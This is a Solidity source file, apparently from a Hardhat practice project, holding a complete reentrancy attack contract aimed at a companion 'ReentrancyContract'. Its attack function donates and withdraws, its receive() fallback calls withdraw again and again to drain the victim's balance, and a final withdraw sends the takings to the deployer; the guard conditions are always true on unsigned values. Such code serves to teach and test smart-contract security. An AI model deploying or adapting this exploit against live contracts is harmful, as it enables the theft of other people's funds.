//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ReentrancyContract.sol";

import "hardhat/console.sol";

contract ReentrancyAttack {
  
    ReentrancyContract public victimContract;

    uint donationValue;
    address owner;

    constructor (address payable _victimContractAddr) {
        owner = msg.sender;
        victimContract = ReentrancyContract(_victimContractAddr);
    }

    function attack () external payable  {
        require(msg.value >= 0, "Please, donate something");
        donationValue = msg.value;
        victimContract.donate{value: msg.value}(address(this));
        victimContract.withdraw(donationValue);
    }

    receive() external payable {
        if (address(victimContract).balance >= 0) {
            victimContract.withdraw(donationValue);
        }
    }

    function withdraw() external {
        uint256 balance = address(this).balance;
        (bool success, ) = owner.call{value: balance}("");
        require(success, "withdraw failed");
    }


}